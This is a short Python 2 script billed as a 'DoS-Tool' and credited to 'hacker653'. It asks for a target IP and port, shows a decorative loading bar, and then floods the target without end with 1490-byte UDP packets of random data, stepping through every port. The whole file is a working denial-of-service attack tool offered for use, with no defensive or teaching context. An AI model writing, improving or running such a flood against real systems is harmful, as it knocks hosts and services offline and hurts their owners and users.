
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print(""" ____       ____      _____           _ 
|  _ \  ___/ ___|    |_   _|__   ___ | |
| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
| |_| | (_) |__) |_____| | (_) | (_) | |
|____/ \___/____/      |_|\___/ \___/|_|

                                                    """)
print
print "Author   : hacker653"
print
ip = raw_input("Enter Target IP : ")
port = input("Enter Port       : ")

os.system("clear")
print("""   _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
                                                    """)
time.sleep(3)
print ("Loading >> [                    ] 0% ")
time.sleep(5)
print ("Loading >> [=====               ] 25%")
time.sleep(5)
print ("Loading >> [===========         ] 50%")
time.sleep(5)
print ("Loading >> [===============     ] 75%")
time.sleep(5)
print ("Loading >> [=================== ]100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
